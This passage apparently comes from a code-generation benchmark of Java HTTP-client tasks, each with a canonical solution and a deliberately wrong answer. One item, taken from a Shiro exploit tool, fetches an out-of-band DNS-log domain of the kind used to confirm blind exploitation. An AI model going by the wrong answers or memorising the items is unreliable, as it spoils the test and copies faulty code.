urlBuilder.append(URLEncoder.encode(param[i].getName(), StandardCharsets.UTF_8));\n                    urlBuilder.append(\"=\");\n                    urlBuilder.append(URLEncoder.encode(param[i].getValue(), StandardCharsets.UTF_8));\n                } catch (UnsupportedEncodingException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        }\n        return urlBuilder.toString();\n    }\n\n    public CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        return CompletableFuture.supplyAsync(() -> {\n            try {\n                URL url = new URL(getUrl(path));\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(method.name());\n                if (username != null && password != null) {\n                    String auth = username + \":\" + password;\n                    auth = Base64.getEncoder().encodeToString(auth.getBytes(StandardCharsets.UTF_8));\n                    connection.setRequestProperty(\"Authorization\", \"Basic \" + auth);\n                }\n                if (options != null) {\n                    for (Option option : options) {\n                        connection.setRequestProperty(option.getName(), option.getValue());\n                    }\n                }\n                if (method == Method.POST || method == Method.PUT) {\n                    if (outStreamConsumer != null) {\n                        try (OutputStream os = connection.getOutputStream()) {\n                            outStreamConsumer.write(os);\n                        } catch (IOException e) {\n                            throw new RuntimeException(e);\n                        }\n                    }\n                }\n                int responseCode = getResponseCodeFrom(connection);\n                String responseText = tryGetResponseTextFrom(connection, responseCode);\n                return new Response(responseCode, responseText, connection.getHeaderFields());\n            } catch (Exception e) {\n                throw new RuntimeException(e);\n            }\n        });\n    }\n\n    private String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        } catch (IOException e) {\n            if (conn.getResponseCode() == 404) {\n                throw new RuntimeException(\"Not Found\", e);\n            }\n            throw e;\n        }\n    }\n\n    private int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        int code = conn.getResponseCode();\n        if (code == 404) {\n            throw new RuntimeException(\"Not Found\");\n        }\n        return code;\n    }\n}"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Java class that interacts with a DNS log service to retrieve a domain and session information for tracking DNS requests.\n\nClass Description: The GetDNSLogRecordTask class is responsible for making an HTTP GET request to a DNS log service (dnslog.cn) to obtain a temporary domain and session cookie. It stores the retrieved information in a configuration object and tracks the operation's status.\n\nAttributes:\n- status: int - Tracks the execution status of the task (1 for success, -1 for failure)\n- config: Config - Configuration object where DNS log information will be stored\n\nMethods:\n- GetDNSLogRecordTask(Config config) -> None - Constructor that initializes the class with a configuration object\n- getStatus() -> int - Returns the current status of the task\n- execute() -> Integer - Performs the HTTP request to get DNS log information and returns 1 regardless of success/failure (legacy behavior)",
    "Canonical_solution": "import com.shiroexploit.util.Config;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class GetDNSLogRecordTask {\n\n    private int status = 0;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config){\n        this.config = config;\n    }\n\n    public int getStatus(){\n        return status;\n    }\n\n    public Integer execute() {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        BufferedReader reader = null;\n        StringBuffer sb = new StringBuffer();\n\n        try {\n            connection = (HttpURLConnection)new URL(\"http://www.dnslog.cn/getdomain.php\").openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                String sessinoId = connection.getHeaderField(\"Set-Cookie\");\n                sessinoId = sessinoId.split(\";\")[0];\n\n                inputStream = connection.getInputStream();\n                reader = new BufferedReader(new InputStreamReader(inputStream));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line);\n                }\n\n                Config.getInstance().setSessionId(sessinoId);\n                Config.getInstance().setDnsLogRecord(sb.toString());\n                status = 1;\n                return 1;\n            }\n        }\n        catch (IOException e) {\n            status = -1;\n            return 1;\n        } finally {\n            try {\n                if (connection != null) connection.disconnect();\n                if (inputStream != null) inputStream.close();\n                if (reader != null) reader.close();\n            } catch (IOException e) {\n                status = -1;\n                return 1;\n            }\n        }\n\n        status = -1;\n        return 1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.*;\nimport java.io.*;\n\npublic class GetDNSLogRecordTask {\n    private int status;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config) {\n        this.config = config;\n        this.status = -1;\n    }\n\n    public int getStatus() {\n        return status;\n    }\n\n    public int execute() {\n        try {\n            URL url = new URL(\"https://dnslog.cn/api/get\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // Placeholder for actual parsing logic\n                String responseStr = response.toString();\n                String domain = \"\";\n                String session = \"\";\n                // Simplified parsing example (actual implementation depends on service response format)\n                if (responseStr.contains(\"domain\")) {\n                    domain = responseStr.split(\"domain\")[1].split(\",\")[0].trim();\n                }\n                if (responseStr.contains(\"session\")) {\n                    session = responseStr.split(\"session\")[1].split(\",\")[0].trim();\n                }\n                config.setDomain(domain);\n                config.setSession(session);\n                status = 1;\n            } else {\n                status = -1;\n            }\n        } catch (Exception e) {\n            status = -1;\n        }\n        return 1;\n    }\n}"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously in an Android environment, using HttpURLConnection for network operations and AsyncTask for background processing.\n\nClass Description: HttpRequestHandler is a utility class designed to perform HTTP GET requests asynchronously. It contains an inner AsyncTask class for background network operations and a helper method for converting InputStream to String.\n\nAttributes: (None - this is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - An AsyncTask subclass that performs HTTP GET requests in the background. Takes a URL string as input and processes the response.\n  - onPreExecute(): void - Empty preparation method (can be overridden)\n  - doInBackground(String...): String - Performs the network request, reads response, and publishes progress\n  - onProgressUpdate(String...): void - Shows the response in a Toast message\n  - onPostExecute(String): void - Empty completion method (can be overridden)\n\nMethod2: ConvertInputToStringNoChange(InputStream) -> String - Helper method that converts an InputStream to a String by reading all lines.\n  - Input: InputStream - The input stream to convert\n  - Output: String - The concatenated string from the input stream",
    "Canonical_solution": "import android.content.Intent;\nimport android.os.AsyncTask;\nimport android.widget.Toast;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n            //before works\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                Toast.makeText(getApplicationContext(), progress[0], Toast.LENGTH_LONG).show();\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {}\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n            // Empty\n        }\n\n        @Override\n        protected String doInBackground(String... urls) {\n            String url = urls[0];\n            try {\n                URL urlObj = new URL(url);\n                HttpURLConnection connection = (HttpURLConnection) urlObj.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.connect();\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = connection.getInputStream();\n                    String response = ConvertInputToStringNoChange(inputStream);\n                    publishProgress(response);\n                    return response;\n                } else {\n                    return \"Error: \" + responseCode;\n                }\n            } catch (Exception e) {\n                return \"Error: \" + e.getMessage();\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            // Show in Toast\n            // Toast.makeText(context, values[0], Toast.LENGTH_SHORT).show();\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            // Empty\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line);\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 83,
    "Instruction": "Task Description: Create a utility class in Java that handles HTTP requests using HttpURLConnection, with support for custom headers and timeouts.\n\nClass Description: HttpHelper is a final utility class that provides static methods for making HTTP requests. It encapsulates the complexity of HttpURLConnection and provides error handling. The class cannot be instantiated.\n\nAttributes: None (This is a utility class with only static methods)\n\nMethods:\nMethod1: getHttpContents(String method, String endpoint, Map<String, String> headers) -> String - Makes an HTTP request to the specified endpoint using the given method and headers. Returns the response content as a String.\n  - Parameters:\n    - method: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n    - endpoint: String - The URL to send the request to\n    - headers: Map<String, String> - Optional map of request headers (can be null)\n  - Returns: String - The response content from the server\n  - Throws: MongoClientException if an IOException occurs during the request",
    "Canonical_solution": "import com.mongodb.MongoClientException;\nimport com.mongodb.lang.NonNull;\nimport com.mongodb.lang.Nullable;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\nfinal class HttpHelper {\n\n    private HttpHelper() {\n    }\n\n    @NonNull\n    public static String getHttpContents(final String method, final String endpoint, @Nullable final Map<String, String> headers) {\n        StringBuilder content = new StringBuilder();\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(endpoint).openConnection();\n            conn.setConnectTimeout(10000);\n            conn.setReadTimeout(10000);\n            conn.setRequestMethod(method);\n            if (headers != null) {\n                for (Map.Entry<String, String> kvp : headers.entrySet()) {\n                    conn.setRequestProperty(kvp.getKey(), kvp.getValue());\n                }\n            }\n\n            int status = conn.getResponseCode();\n            if (status != HttpURLConnection.HTTP_OK) {\n                throw new IOException(String.format(\"%d %s\", status, conn.getResponseMessage()));\n            }\n\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    content.append(inputLine);\n                }\n            }\n        } catch (IOException e) {\n            throw new MongoClientException(\"Unexpected IOException from endpoint \" + endpoint + \".\", e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        return content.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.util.Map;\n\npublic final class HttpHelper {\n    public static String getHttpContents(String method, String endpoint, Map<String, String> headers) throws MongoClientException {\n        try {\n            URL url = new URL(endpoint);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            if (headers != null) {\n                for (Map.Entry<String, String> header : headers.entrySet()) {\n                    connection.setRequestProperty(header.getKey(), header.getValue());\n                }\n            }\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 400) {\n                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n                StringBuilder errorContent = new StringBuilder();\n                String line;\n                while ((line = errorReader.readLine()) != null) {\n                    errorContent.append(line);\n                }\n                throw new MongoClientException(\"HTTP error: \" + responseCode + \" - \" + errorContent.toString());\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        } catch (IOException e) {\n            throw new MongoClientException(\"IO error: \" + e.getMessage(), e);\n        }\n    }\n}"
  },
  {
    "Task_id": 84,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling authentication, and processing JSON responses.\n\nClass Description: JobRemotingUtil is a utility class that provides functionality for making remote HTTP POST requests with JSON data. It handles connection setup, request configuration, payload serialization, response processing, and error handling. The class includes logging capabilities and supports access token authentication.\n\nAttributes:\nlogger: [Logger] - SLF4J logger instance for logging errors and debug information\nXXL_RPC_ACCESS_TOKEN: [String] - Constant string for the authentication token header name\n\nMethods:\npostBody: [Name](String url, String accessToken, Object requestObj, int timeout) -> ReturnT<String> - Makes an HTTP POST request to the specified URL with the given request object serialized as JSON. Handles authentication via access token, sets appropriate headers, and processes the JSON response. Returns a ReturnT<String> object containing the response status, message, and content. The timeout parameter specifies the read timeout in seconds.",
    "Canonical_solution": "import com.wugui.datatx.core.biz.model.ReturnT;\nimport com.wugui.datax.rpc.util.json.BasicJson;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class JobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_RPC_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            String requestBody = BasicJson.toJson(requestObj);\n            DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n            dataOutputStream.writeBytes(requestBody);\n            dataOutputStream.flush();\n            dataOutputStream.close();\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                Map<String, Object> resultMap = BasicJson.parseMap(resultJson);\n\n                ReturnT<String> returnT = new ReturnT<String>();\n                if (resultMap==null) {\n                    returnT.setCode(ReturnT.FAIL_CODE);\n                    returnT.setMsg(\"AdminBizClient Remoting call fail.\");\n                } else {\n                    returnT.setCode(Integer.valueOf(String.valueOf(resultMap.get(\"code\"))));\n                    returnT.setMsg(String.valueOf(resultMap.get(\"msg\")));\n                    returnT.setContent(String.valueOf(resultMap.get(\"content\")));\n                }\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class JobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static final String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        ObjectMapper mapper = new ObjectMapper();\n        String jsonBody = null;\n        try {\n            jsonBody = mapper.writeValueAsString(requestObj);\n        } catch (Exception e) {\n            logger.error(\"Failed to serialize request object\", e);\n            return new ReturnT<>(false, \"Failed to serialize request\", null);\n        }\n\n        try {\n            URI uri = URI.create(url);\n            HttpClient client = HttpClient.newHttpClient();\n            HttpRequest request = HttpRequest.newBuilder(uri)\n                    .header(XXL_RPC_ACCESS_TOKEN, accessToken)\n                    .header(\"Content-Type\", \"application/json\")\n                    .POST(HttpRequest.BodyPublishers.ofString(jsonBody))\n                    .build();\n            request = request.toBuilder()\n                    .deadline(Duration.ofSeconds(timeout))\n                    .build();\n\n            try {\n                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n                int statusCode = response.statusCode();\n                logger.debug(\"Received response with status code: {}\", statusCode);\n                if (statusCode == 200) {\n                    return new ReturnT<>(true, \"Success\", response.body());\n                } else {\n                    String errorMessage = \"HTTP error: \" + statusCode;\n                    logger.error(errorMessage);\n                    return new ReturnT<>(false, errorMessage, null);\n                }\n            } catch (IOException | InterruptedException e) {\n                logger.error(\"Request failed\", e);\n                return new ReturnT<>(false, \"Request failed\", null);\n            }\n        } catch (Exception e) {\n            logger.error(\"Invalid URL\", e);\n            return new ReturnT<>(false, \"Invalid URL\", null);\n        }\n    }\n}"
  },
  {
    "Task_id": 85,
    "Instruction": "Task Description: Create a function that sends an HTTP POST request to a specified URL with a given parameter and returns the response as a string.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends a POST request with the specified parameter, reads the response from the server, and returns it as a string. It handles the connection setup, request configuration, data transmission, and response processing.\n\nInput:\n- url (String): The target URL to which the HTTP POST request will be sent.\n- name (String): The parameter value to be sent in the request body (as \"name=[value]\").\n\nOutput:\n- String: The response received from the server as a string. If an error occurs, the function will return an empty string after printing the stack trace.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate String sendHttpRequest(String url, String name) {\n    StringBuffer buffer = new StringBuffer();\n    try {\n        HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.connect();\n        con.getOutputStream().write( (\"name=\" + name).getBytes());\n        \n        InputStream is = con.getInputStream();\n        byte[] b = new byte[1024];\n        \n        while ( is.read(b) != -1)\n            buffer.append(new String(b));\n        \n        con.disconnect();\n    }\n    catch(Throwable t) {\n        t.printStackTrace();\n    }\n    \n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public static String sendPostRequest(String url, String name) {\n    try {\n        URL obj = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        String data = \"name=\" + name;\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] input = data.getBytes(\"utf-8\");\n            os.write(input);\n        }\n        int responseCode = conn.getResponseCode();\n        if (responseCode == 200) {\n            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } else {\n            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        return \"\";\n    }\n}"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, with callback functionality for progress updates and post-execution results.\n\nClass Description: HttpRequestHandler is a utility class that provides asynchronous HTTP request capabilities through an inner AsyncTask class. It's designed for Android applications to perform network operations off the main thread and communicate results back through callbacks.\n\nAttributes:\n- callback: HttpRequestCallback - Interface reference for receiving progress updates and final results\n\nMethods:\n- MyAsyncTaskgetNews(HttpRequestCallback) -> Constructor - Initializes the async task with a callback interface\n- doInBackground(String...) -> String - Performs the HTTP request in the background (takes URL as input)\n- onProgressUpdate(String...) -> void - Publishes progress updates to the callback\n- onPostExecute(String) -> void - Notifies callback when execution completes\n\nInterface Methods (HttpRequestCallback):\n- onProgressUpdate(String...) -> void - Called when progress updates are available\n- onPostExecute(String) -> void - Called when the async task completes",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... progress);\n        void onPostExecute(String result);\n    }\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        private HttpRequestCallback callback;\n\n        public MyAsyncTaskgetNews(HttpRequestCallback callback) {\n            this.callback = callback;\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(); // Context would need to be passed if needed\n                    String NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            if (callback != null) {\n                callback.onProgressUpdate(progress);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    private HttpRequestCallback callback;\n\n    public HttpRequestHandler(HttpRequestCallback callback) {\n        this.callback = callback;\n    }\n\n    public class MyAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... urls) {\n            String url = urls[0];\n            try {\n                URL urlObj = new URL(url);\n                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.connect();\n\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = conn.getInputStream();\n                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n                    byte[] buffer = new byte[1024];\n                    int bytesRead;\n                    int totalBytesRead = 0;\n                    int totalLength = conn.getContentLength();\n                    while ((bytesRead = inputStream.read(buffer)) != -1) {\n                        outputStream.write(buffer, 0, bytesRead);\n                        totalBytesRead += bytesRead;\n                        if (totalLength > 0) {\n                            float progress = (float) totalBytesRead / totalLength;\n                            publishProgress(String.valueOf(totalBytesRead) + \" bytes read\");\n                        } else {\n                            publishProgress(\"Reading data...\");\n                        }\n                    }\n                    String response = outputStream.toString(\"UTF-8\");\n                    return response;\n                } else {\n                    return \"Error: \" + responseCode;\n                }\n            } catch (Exception e) {\n                return \"Error: \" + e.getMessage();\n            } finally {\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            if (callback != null) {\n                callback.onProgressUpdate(values);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n\n    public void executeRequest(String url) {\n        new MyAsyncTask().execute(url);\n    }\n}\n\npublic interface HttpRequestCallback {\n    void onProgressUpdate(String... values);\n    void onPostExecute(String result);\n}"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making network requests, with support for gzip compression, proxy interaction, and error handling.\n\nClass Description: The HttpService class provides HTTP client capabilities for making POST requests to specified endpoints. It handles request construction, connection management, response processing, and includes features like gzip compression, SSL socket configuration, proxy server interaction, and automatic retries for failed requests.\n\nAttributes:\n\nshouldGzipRequestPayload: boolean - Determines whether request payload should be gzip compressed\nMIN_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Minimum HTTP response code considered as service unavailable (500)\nMAX_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Maximum HTTP response code considered as service unavailable (599)\nLOGTAG: String - Tag used for logging messages\nHTTP_OUTPUT_STREAM_BUFFER_SIZE: int - Buffer size for output streams (8192 bytes)\nCONTENT_ENCODING_HEADER: String - Header key for content encoding\nGZIP_CONTENT_TYPE_HEADER: String - Value for gzip content encoding\n\nMethods:\n\nperformRequest: performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) -> byte[] - Makes an HTTP POST request to the specified endpoint with optional parameters and SSL configuration. Handles retries for failed requests and returns the response body as bytes. Throws ServiceUnavailableException for 5xx responses and IOException for other failures.\n\ngetBufferedOutputStream: getBufferedOutputStream(OutputStream out) -> OutputStream - Creates a buffered output stream, optionally wrapped in a GZIPOutputStream based on shouldGzipRequestPayload.\n\nisProxyRequest: isProxyRequest(String endpointUrl) -> boolean - Determines if the request is a proxy request by checking the endpoint URL.\n\nslurp: slurp(InputStream inputStream) -> byte[] - Reads all bytes from an input stream and returns them as a byte array.",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.net.Uri;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPOutputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class HttpService implements RemoteService {\n\n    private final boolean shouldGzipRequestPayload;\n    private static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = HttpURLConnection.HTTP_INTERNAL_ERROR;\n    private static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private static final String LOGTAG = \"MixpanelAPI.Message\";\n    private static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    @Override\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        MPLog.v(LOGTAG, \"Attempting request to \" + endpointUrl);\n\n        byte[] response = null;\n        int retries = 0;\n        boolean succeeded = false;\n        while (retries < 3 && !succeeded) {\n            InputStream in = null;\n            OutputStream out = null;\n            OutputStream bout = null;\n            HttpURLConnection connection = null;\n\n            try {\n                final URL url = new URL(endpointUrl);\n                connection = (HttpURLConnection) url.openConnection();\n                if (null != socketFactory && connection instanceof HttpsURLConnection) {\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n                }\n\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    Map<String,String> headers = interactor.getProxyRequestHeaders();\n                    if (headers != null) {\n                        for (Map.Entry<String, String> entry : headers.entrySet()) {\n                            connection.setRequestProperty(entry.getKey(), entry.getValue());\n                        }\n                    }\n                }\n\n                connection.setConnectTimeout(2000);\n                connection.setReadTimeout(30000);\n                if (null != params) {\n                    Uri.Builder builder = new Uri.Builder();\n                    for (Map.Entry<String, Object> 